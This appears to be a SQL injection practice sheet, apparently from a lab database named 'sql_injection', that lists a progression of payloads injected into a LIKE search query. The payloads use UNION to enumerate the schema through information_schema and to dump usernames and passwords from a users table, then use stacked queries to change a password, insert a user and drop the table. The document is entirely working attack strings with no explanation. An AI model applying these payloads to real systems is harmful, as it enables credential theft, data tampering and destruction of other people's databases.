SELECT _,_,_ FROM _ WHERE _ LIKE '%keyword%';

SELECT _,_,_ FROM _ WHERE _ LIKE '%'; -- ;

SELECT _,_,_ FROM _ WHERE _ LIKE '%' UNION (SELECT 1,2,3); -- ;

SELECT _,_,_ FROM _ WHERE _ LIKE '%' UNION (SELECT 1,2,DATABASE()); -- ;

SELECT _,_,_ FROM _ WHERE _ LIKE '%' UNION 
    (SELECT 1,2,table_name from information_schema.tables where table_schema = 'sql_injection'); -- %';

SELECT _,_,_ FROM _ WHERE _ LIKE '%' UNION 
    (SELECT 1,2,`COLUMN_NAME` 
        FROM `INFORMATION_SCHEMA`.`COLUMNS` 
        WHERE `TABLE_SCHEMA`='sql_injection' 
        AND `TABLE_NAME`='users'); -- %';

SELECT _,_,_ FROM _ WHERE _ LIKE '%' UNION 
    (SELECT uname, upass, uphone FROM users); -- %';

SELECT _,_,_ FROM _ WHERE _ LIKE '%' UNION 
    (SELECT uid, uname, upass FROM users); -- %';

SELECT _,_,_ FROM _ WHERE _ LIKE '%';
	UPDATE users SET upass="sairockzzzz" WHERE uid=3; -- %';

SELECT _,_,_ FROM _ WHERE _ LIKE '%';
    INSERT INTO users(uname, upass, uphone) VALUES ("Mark", "facebook", "1234545"); -- %';

SELECT _,_,_ FROM _ WHERE _ LIKE '%';
    DROP TABLE users; -- %';



